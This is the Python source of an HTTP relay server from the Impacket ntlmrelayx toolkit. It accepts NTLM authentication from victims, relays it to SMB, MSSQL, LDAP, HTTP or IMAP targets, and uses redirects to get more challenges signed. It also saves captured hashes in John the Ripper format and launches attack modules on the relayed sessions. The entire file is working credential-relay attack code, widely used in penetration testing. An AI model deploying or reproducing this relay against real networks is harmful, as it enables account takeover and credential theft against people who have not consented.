#!/usr/bin/env python
# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Server
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This is the HTTP server which relays the NTLMSSP  messages to other protocols

import SimpleHTTPServer
import SocketServer
import base64
import random
import struct
import string
import traceback
from threading import Thread

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections

class HTTPRelayServer(Thread):
    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_threads = True
            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)

    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        def __init__(self,request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None
            if self.server.config.mode != 'REDIRECT':
                if self.server.config.target is None:
                    # Reflection mode, defaults to SMB at the target, for now
                    self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
                self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
                LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
            except Exception, e:
                LOG.error(str(e))
                LOG.debug(traceback.format_exc())

        def handle_one_request(self):
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
            except KeyboardInterrupt:
                raise
            except Exception, e:
                LOG.error('Exception in HTTP request handler: %s' % e)
                LOG.debug(traceback.format_exc())

        def log_message(self, format, *args):
            return

        def send_error(self, code, message=None):
            if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                return self.do_GET()
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_AUTHHEAD(self, message = ''):
            self.send_response(401)
            self.send_header('WWW-Authenticate', message)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length','0')
            self.end_headers()

        #Trickery to get the victim to sign more challenges
        def do_REDIRECT(self):
            rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
            self.send_response(302)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection','close')
            self.send_header('Location','/%s' % rstr)
            self.send_header('Content-Length','0')
            self.end_headers()

        def do_SMBREDIRECT(self):
            self.send_response(302)
            self.send_header('Content-type', 'text/html')
            self.send_header('Location','file://%s' % self.server.config.redirecthost)
            self.send_header('Content-Length','0')
            self.send_header('Connection','close')
            self.end_headers()

        def do_GET(self):
            messageType = 0
            if self.server.config.mode == 'REDIRECT':
                self.do_SMBREDIRECT()
                return

            if self.headers.getheader('Authorization') is None:
                self.do_AUTHHEAD(message = 'NTLM')
                pass
            else:
                typeX = self.headers.getheader('Authorization')
                try:
                    _, blob = typeX.split('NTLM')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD()
                messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 1:
                if not self.do_ntlm_negotiate(token):
                    #Connection failed
                    self.server.config.target.logTarget(self.target)
                    self.do_REDIRECT()
            elif messageType == 3:
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if not self.do_ntlm_auth(token,authenticateMessage):
                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))

                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                    if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
                        self.server.config.target.logTarget(self.target)
                        # No anonymous login, go to next host and avoid triggering a popup
                        self.do_REDIRECT()
                    else:
                        # If it was an anonymous login, send 401
                        self.do_AUTHHEAD('NTLM')
                else:
                    # Relay worked, do whatever we want here...
                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))

                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.config.outputFile is not None:
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)

                    self.server.config.target.logTarget(self.target)

                    self.do_attack()

                    # And answer 404 not found
                    self.send_response(404)
                    self.send_header('WWW-Authenticate', 'NTLM')
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Content-Length','0')
                    self.send_header('Connection','close')
                    self.end_headers()
            return

        def do_ntlm_negotiate(self,token):
            if self.server.config.protocolClients.has_key(self.target.scheme.upper()):
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                self.client.initConnection()
                self.challengeMessage = self.client.sendNegotiate(token)
            else:
                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())

            #Calculate auth
            self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
            return True

        def do_ntlm_auth(self,token,authenticateMessage):
            #For some attacks it is important to know the authenticated username, so we store it
            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le'))).upper()

            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                clientResponse, errorCode = self.client.sendAuth(token)
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                # when coming from localhost
                errorCode = STATUS_ACCESS_DENIED

            if errorCode == STATUS_SUCCESS:
                return True

            return False

        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # For now, we only support SOCKS for SMB/MSSQL, for now.
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.authUser, self.client.session, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() == 'MSSQL':
                clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client.session)
                clientThread.start()
            if self.target.scheme.upper() == 'SMB':
                clientThread = self.server.config.attacks['SMB'](self.server.config, self.client.session, self.authUser)
                clientThread.start()
            if self.target.scheme.upper() == 'LDAP' or self.target.scheme.upper() == 'LDAPS':
                clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client.session, self.authUser)
                clientThread.start()
            if self.target.scheme.upper() == 'HTTP' or self.target.scheme.upper() == 'HTTPS':
                clientThread = self.server.config.attacks['HTTP'](self.server.config, self.client.session, self.authUser)
                clientThread.start()
            if self.target.scheme.upper() == 'IMAP' or self.target.scheme.upper() == 'IMAPS':
                clientThread = self.server.config.attacks['IMAP'](self.server.config, self.client.session, self.authUser)
                clientThread.start()

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config

    def run(self):
        LOG.info("Setting up HTTP Server")
        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.config)
        try:
             httpd.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down HTTP Server')
        httpd.server_close()
